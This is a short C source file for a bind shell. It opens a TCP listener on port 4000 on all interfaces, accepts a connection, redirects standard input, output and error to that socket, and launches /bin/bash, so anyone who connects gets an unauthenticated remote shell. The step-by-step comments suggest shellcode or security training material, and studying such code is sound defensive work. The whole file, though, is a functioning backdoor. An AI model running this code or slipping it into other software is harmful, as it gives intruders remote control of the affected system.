#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 

int main() { 

  // Define struct containing bind() arguments, socket file descriptor and id.
  struct sockaddr_in server; 
  int socketfd; 
  int socketid; 

   
  // Create socket 
  socketfd = socket(AF_INET, SOCK_STREAM, 6); 

  // Setup struct "server" containing following information: address, port and address family
  server.sin_addr.s_addr = htonl(INADDR_ANY); // any address (0.0.0.0)
  server.sin_port = htons(4000);              // port 4000
  server.sin_family = AF_INET;                // address family (ip v4)

  // Bind socket to ip 0.0.0.0, port 4000 
  bind(socketfd, (struct sockaddr*) &server, sizeof(server)); 

  // Listen for incoming connections 
  listen(socketfd, 2); 

  // Accept incoming connection 
  socketid = accept(socketfd, NULL, NULL); 

  // Bind STDIN (0), STDOUT (1), STDERR (2) to incoming connection 
  dup2(socketid, 0); 
  dup2(socketid, 1); 
  dup2(socketid, 2); 

  // Run /bin/bash shell 
  execve("/bin/bash", NULL, NULL); 
}
